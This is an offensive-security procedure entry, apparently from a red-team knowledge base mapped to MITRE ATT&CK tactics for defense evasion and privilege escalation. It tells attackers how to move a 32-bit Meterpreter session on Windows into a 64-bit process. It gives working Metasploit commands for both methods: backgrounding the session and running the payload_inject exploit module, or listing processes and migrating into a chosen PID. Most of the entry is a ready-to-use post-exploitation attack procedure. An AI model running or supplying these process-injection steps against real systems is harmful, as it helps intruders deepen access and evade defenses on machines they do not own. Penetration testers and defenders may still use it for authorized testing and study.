---
id: 90c77397-f697-4324-b6c0-583909689187
name: Upgrade Windows Meterpreter x32 Shell to x64
type: procedure
verified: true
submitted: true
created_at: '2019-11-14T01:00:13.652758+00:00'
updated_at: '2023-05-25T20:00:05.354793+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Process Injection|T1055 - Process Injection]]'
platforms:
- Windows
tags:
- '[[injection]]'
- '[[known vulnerability]]'
- '[[Service Attacks]]'
commands:
- '[[Metasploit Background the Current Session]]'
- '[[Metasploit List Running Processes]]'
- '[[Meterpreter Background a Session]]'
- '[[Meterpreter List Running Processes]]'
- '[[Meterpreter Migrate to a Process]]'
- '[[Meterpreter Migrate to x64 Process with Payload Inject]]'
---

# Upgrade Windows Meterpreter x32 Shell to x64

**Status**: ✓ Verified

## Summary

When using a x32 version of PowerShell on a x64 Windows, many PowerShell features will be unavailable. It is generally recommended that, when possible, attackers move to a x64 PowerShell instance. 

## Description

# Description

When using a x32 version of PowerShell on a x64 Windows, many PowerShell features will be unavailable. It is generally recommended that, when possible, attackers move to a x64 PowerShell instance.



# Instructions

There are two approaches for moving to a x64 PowerShell instance



## Using Metasploit Module Payload Inject

1. From an active Meterpreter session, background the session.





**Command** ([[Metasploit Background the Current Session]]):

```bash
bg
```





2. Load and execute "exploit/windows/local/payload_inject" module on the Meterpreter session





**Command** ([[Meterpreter Migrate to x64 Process with Payload Inject]]):

```bash
use exploit/windows/local/payload_inject
set session 2
run
```







## Using the Migrate Command



1. From a Meterpreter session, use ps to list processes.





**Command** ([[Metasploit List Running Processes]]):

```bash
ps
```



Identify a process which is listed as x64. Processes that are automatically started by the system at start up may be more reliable than others.





2. Migrate to the selected process using the PID





**Command** ([[Meterpreter Migrate to a Process]]):

```bash
migrate $_PID
```



























## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Process Injection|T1055 - Process Injection]]

## Commands Used

- [[Metasploit Background the Current Session]]
- [[Metasploit List Running Processes]]
- [[Meterpreter Background a Session]]
- [[Meterpreter List Running Processes]]
- [[Meterpreter Migrate to a Process]]
- [[Meterpreter Migrate to x64 Process with Payload Inject]]

## Tags

- [[injection]]
- [[known vulnerability]]
- [[Service Attacks]]


